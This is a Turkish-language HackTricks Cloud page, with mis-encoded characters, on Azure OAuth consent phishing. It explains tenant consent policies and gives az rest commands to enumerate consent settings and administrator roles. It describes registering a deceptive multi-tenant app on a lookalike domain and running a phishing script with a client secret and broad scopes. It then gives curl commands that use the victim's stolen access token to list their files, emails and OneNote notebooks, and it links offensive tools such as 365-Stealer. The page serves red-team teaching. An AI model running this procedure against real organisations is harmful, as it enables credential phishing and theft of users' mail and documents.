# Az - OAuth UygulamalarÄ± Phishing

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## OAuth Uygulama Phishing

**Azure UygulamalarÄ±**, bir kullanÄ±cÄ±nÄ±n uygulamayÄ± onayladÄ±ÄŸÄ±nda kullanabileceÄŸi izinlerle yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r (Ã¶rneÄŸin dizini listeleme, dosyalara eriÅŸim veya diÄŸer eylemleri gerÃ§ekleÅŸtirme). UygulamanÄ±n kullanÄ±cÄ± adÄ±na hareket edeceÄŸini unutmayÄ±n, bu nedenle uygulama yÃ¶netim izinleri talep etse bile, eÄŸer **kullanÄ±cÄ± bu izne sahip deÄŸilse**, uygulama **yÃ¶netimsel eylemleri gerÃ§ekleÅŸtiremeyecektir**.

### Uygulama onay izinleri

VarsayÄ±lan olarak, herhangi bir **kullanÄ±cÄ± uygulamalara onay verebilir**, ancak bu, kullanÄ±cÄ±larÄ±n yalnÄ±zca **seÃ§ilen izinler iÃ§in doÄŸrulanmÄ±ÅŸ yayÄ±ncÄ±lardan uygulamalara onay verebileceÄŸi** ÅŸekilde yapÄ±landÄ±rÄ±labilir veya kullanÄ±cÄ±larÄ±n uygulamalara onay verme izninin **kaldÄ±rÄ±lmasÄ±** saÄŸlanabilir.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

EÄŸer kullanÄ±cÄ±lar onay veremiyorsa, `GA`, `Uygulama YÃ¶neticisi` veya `Bulut Uygulama` `YÃ¶neticisi` gibi **yÃ¶neticiler**, kullanÄ±cÄ±larÄ±n kullanabileceÄŸi **uygulamalara onay verebilir**.

AyrÄ±ca, eÄŸer kullanÄ±cÄ±lar yalnÄ±zca **dÃ¼ÅŸÃ¼k riskli** izinlere sahip uygulamalara onay verebiliyorsa, bu izinler varsayÄ±lan olarak **openid**, **profil**, **email**, **User.Read** ve **offline\_access**'dir, ancak bu listeye **daha fazlasÄ±nÄ± eklemek** mÃ¼mkÃ¼ndÃ¼r.

EÄŸer tÃ¼m uygulamalara onay verebiliyorlarsa, tÃ¼m uygulamalara onay verebilirler.

### 2 TÃ¼r saldÄ±rÄ±

* **Kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ**: DÄ±ÅŸ bir hesaptan, Ã¶rneÄŸin `User.Read` ve `User.ReadBasic.All` gibi **dÃ¼ÅŸÃ¼k riskli izinlerle** bir uygulama oluÅŸturun, bir kullanÄ±cÄ±yÄ± phishing yapÄ±n ve dizin bilgilerine eriÅŸim saÄŸlayÄ±n.
* Bu, phishing yapÄ±lan kullanÄ±cÄ±nÄ±n **dÄ±ÅŸ kiracÄ±dan OAuth uygulamalarÄ±nÄ± kabul edebilmesi** gerektirir.
* EÄŸer phishing yapÄ±lan kullanÄ±cÄ±, **herhangi bir izinle herhangi bir uygulamaya onay verebilen** bir yÃ¶netici ise, uygulama **ayrÄ±lmÄ±ÅŸ izinler** talep edebilir.
* **Kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ**: Yeterli ayrÄ±calÄ±klara sahip bir anahtarÄ± ele geÃ§irdikten sonra, **hesap iÃ§inde bir uygulama oluÅŸturun** ve **ayrÄ±lmÄ±ÅŸ** OAuth izinlerini kabul edebilecek bazÄ± **ayrÄ±lmÄ±ÅŸ** kullanÄ±cÄ±larÄ± **phishing** yapÄ±n.
* Bu durumda, dizin bilgilerine zaten eriÅŸiminiz olduÄŸu iÃ§in `User.ReadBasic.All` izni artÄ±k ilginÃ§ deÄŸildir.
* **YÃ¶netici tarafÄ±ndan verilmesi gereken izinlerle** ilgileniyorsanÄ±z, Ã§Ã¼nkÃ¼ sÄ±radan bir kullanÄ±cÄ± OAuth uygulamalarÄ±na herhangi bir izin veremez, bu yÃ¼zden yalnÄ±zca **bu kullanÄ±cÄ±larÄ± phishing yapmalÄ±sÄ±nÄ±z** (bu ayrÄ±calÄ±ÄŸÄ± hangi roller/izinlerin verdiÄŸi hakkÄ±nda daha fazla bilgi daha sonra).

### KullanÄ±cÄ±larÄ±n onay vermesine izin verilir

Bu komutu kiracÄ± iÃ§indeki bir kullanÄ±cÄ±dan Ã§alÄ±ÅŸtÄ±rmanÄ±z gerektiÄŸini unutmayÄ±n, dÄ±ÅŸ bir kiracÄ±dan bu yapÄ±landÄ±rmayÄ± bulamazsÄ±nÄ±z. AÅŸaÄŸÄ±daki cli, kullanÄ±cÄ±larÄ±n izinlerini anlamanÄ±za yardÄ±mcÄ± olabilir:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```
{% endcode %}

* KullanÄ±cÄ±lar tÃ¼m uygulamalara onay verebilir: EÄŸer **`permissionGrantPoliciesAssigned`** iÃ§inde: `ManagePermissionGrantsForSelf.microsoft-user-default-legacy` bulursanÄ±z, kullanÄ±cÄ±lar her uygulamayÄ± kabul edebilir.
* KullanÄ±cÄ±lar yalnÄ±zca seÃ§tiÄŸiniz izinler iÃ§in doÄŸrulanmÄ±ÅŸ yayÄ±ncÄ±lardan veya kuruluÅŸunuzdan gelen uygulamalara onay verebilir: EÄŸer **`permissionGrantPoliciesAssigned`** iÃ§inde: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` bulursanÄ±z, kullanÄ±cÄ±lar her uygulamayÄ± kabul edebilir.
* **KullanÄ±cÄ± onayÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak**: EÄŸer **`permissionGrantPoliciesAssigned`** iÃ§inde yalnÄ±zca: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-chat` ve `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` bulursanÄ±z, kullanÄ±cÄ±lar hiÃ§birine onay veremez.

Yorumlanan politikalarÄ±n her birinin anlamÄ±nÄ± bulmak mÃ¼mkÃ¼ndÃ¼r: 

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies"
```
{% endcode %}

### **Uygulama YÃ¶neticileri**

Yeni uygulamalarÄ± kabul edebilen uygulama yÃ¶neticisi olarak kabul edilen kullanÄ±cÄ±larÄ± kontrol edin:

{% code overflow="wrap" %}
```bash
# Get list of roles
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Get Global Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"

# Get Application Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"

# Get Cloud Applications Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members"
```
{% endcode %}

## **SaldÄ±rÄ± AkÄ±ÅŸÄ±nÄ±n Genel GÃ¶rÃ¼nÃ¼mÃ¼**

SaldÄ±rÄ±, genel bir ÅŸirketi hedef alan birkaÃ§ adÄ±mÄ± iÃ§erir. Ä°ÅŸte nasÄ±l geliÅŸebileceÄŸi:

1. **Alan AdÄ± KaydÄ± ve Uygulama BarÄ±ndÄ±rma**: SaldÄ±rgan, gÃ¼venilir bir siteyi andÄ±ran bir alan adÄ± kaydeder, Ã¶rneÄŸin "safedomainlogin.com". Bu alan adÄ± altÄ±nda, yetkilendirme kodlarÄ±nÄ± yakalamak ve eriÅŸim token'larÄ± talep etmek iÃ§in tasarlanmÄ±ÅŸ bir uygulamayÄ± barÄ±ndÄ±rmak Ã¼zere bir alt alan adÄ± oluÅŸturulur (Ã¶rneÄŸin, "companyname.safedomainlogin.com").
2. **Azure AD'de Uygulama KaydÄ±**: SaldÄ±rgan, hedef ÅŸirketin adÄ±nÄ± kullanarak Azure AD KiracÄ±sÄ±nda Ã‡oklu KiracÄ± UygulamasÄ± kaydeder, bÃ¶ylece meÅŸru gÃ¶rÃ¼nÃ¼r. UygulamanÄ±n YÃ¶nlendirme URL'sini kÃ¶tÃ¼ niyetli uygulamayÄ± barÄ±ndÄ±ran alt alan adÄ±na yÃ¶nlendirecek ÅŸekilde yapÄ±landÄ±rÄ±r.
3. **Ä°zinlerin AyarlanmasÄ±**: SaldÄ±rgan, uygulamayÄ± Ã§eÅŸitli API izinleriyle (Ã¶rneÄŸin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) ayarlar. Bu izinler, kullanÄ±cÄ± tarafÄ±ndan verildiÄŸinde, saldÄ±rgana kullanÄ±cÄ±nÄ±n adÄ±na hassas bilgileri Ã§Ä±karmasÄ±na olanak tanÄ±r.
4. **KÃ¶tÃ¼ AmaÃ§lÄ± BaÄŸlantÄ±larÄ±n DaÄŸÄ±tÄ±lmasÄ±**: SaldÄ±rgan, kÃ¶tÃ¼ niyetli uygulamanÄ±n istemci kimliÄŸini iÃ§eren bir baÄŸlantÄ± hazÄ±rlar ve bunu hedeflenen kullanÄ±cÄ±lara paylaÅŸarak onlarÄ±n onay vermelerini saÄŸlar.

## Ã–rnek SaldÄ±rÄ±

1. **Yeni bir uygulama kaydedin**. EÄŸer saldÄ±rÄ±ya uÄŸrayan dizinden bir kullanÄ±cÄ± kullanÄ±yorsanÄ±z, yalnÄ±zca mevcut dizin iÃ§in olabilir veya bu bir dÄ±ÅŸ saldÄ±rÄ±ysa (aÅŸaÄŸÄ±daki resimde olduÄŸu gibi) herhangi bir dizin iÃ§in olabilir.
1. AyrÄ±ca **yÃ¶nlendirme URI'sini** almak istediÄŸiniz token'larÄ± almak iÃ§in kodu alacaÄŸÄ±nÄ±z beklenen URL'ye ayarlayÄ±n (`http://localhost:8000/callback` varsayÄ±lan olarak).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

2. ArdÄ±ndan bir uygulama sÄ±rrÄ± oluÅŸturun:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. API izinlerini seÃ§in (Ã¶rneÄŸin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

4. **Ä°zinleri isteyen web sayfasÄ±nÄ± (**[**azure\_oauth\_phishing\_example**](https://github.com/carlospolop/azure_oauth_phishing_example)**)** Ã§alÄ±ÅŸtÄ±rÄ±n:

{% code overflow="wrap" %}
```bash
# From https://github.com/carlospolop/azure_oauth_phishing_example
python3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read"
```
{% endcode %}

5. **URL'yi kurbanÄ±n gÃ¶nderin**
1. Bu durumda `http://localhost:8000`
6. **Kurbanlar** **isteÄŸi kabul etmelidir:**

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

7. **Ä°stenen izinlere eriÅŸmek iÃ§in eriÅŸim jetonunu kullanÄ±n**:
```bash
export ACCESS_TOKEN=<ACCESS_TOKEN>

# List drive files
curl -X GET \
https://graph.microsoft.com/v1.0/me/drive/root/children \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List eails
curl -X GET \
https://graph.microsoft.com/v1.0/me/messages \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List notes
curl -X GET \
https://graph.microsoft.com/v1.0/me/onenote/notebooks \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"
```
## DiÄŸer AraÃ§lar

* [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)**:** Bunu yapÄ±landÄ±rmayÄ± Ã¶ÄŸrenmek iÃ§in [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresini kontrol edin.
* [**O365-Attack-Toolkit**](https://github.com/mdsecactivebreach/o365-attack-toolkit)

## SonrasÄ±-Ä°stismar

### Phishing SonrasÄ±-Ä°stismar

Ä°stenen izinlere baÄŸlÄ± olarak **kiracÄ±nÄ±n farklÄ± verilerine eriÅŸim saÄŸlayabilirsiniz** (kullanÄ±cÄ±larÄ±, gruplarÄ± listeleme... veya ayarlarÄ± deÄŸiÅŸtirme) ve **kullanÄ±cÄ± bilgilerine** (dosyalar, notlar, e-postalar...) eriÅŸebilirsiniz. ArdÄ±ndan, bu izinleri bu eylemleri gerÃ§ekleÅŸtirmek iÃ§in kullanabilirsiniz.

### Uygulama SonrasÄ± Ä°stismar

SayfanÄ±n Uygulamalar ve Hizmet Prensibi bÃ¶lÃ¼mlerini kontrol edin:

{% content-ref url="../az-privilege-escalation/az-entraid-privesc/" %}
[az-entraid-privesc](../az-privilege-escalation/az-entraid-privesc/)
{% endcontent-ref %}

## Referanslar

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
